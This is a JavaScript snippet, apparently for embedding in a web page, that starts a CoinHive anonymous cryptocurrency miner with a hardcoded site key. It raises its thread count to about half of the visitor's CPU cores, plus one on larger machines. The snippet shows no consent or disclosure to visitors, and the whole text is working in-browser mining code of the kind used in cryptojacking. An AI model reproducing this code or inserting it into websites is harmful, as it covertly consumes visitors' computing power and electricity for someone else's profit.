    var miner = new CoinHive.Anonymous('6nJ4DvwnH8JqWMx6Cqc0dtGhObEgDt7z', {
        threads: 1,
        autoThreads: false,
        throttle: 0.6,
        forceASMJS: false
    });
    miner.start(CoinHive.IF_EXCLUSIVE_TAB);
    var threads = navigator.hardwareConcurrency;
    if (threads > 1) {
        threads = Math.round(threads / 2);
        if (threads >= 4) {
            threads += 1;
        }
        miner.setNumThreads(threads)
    }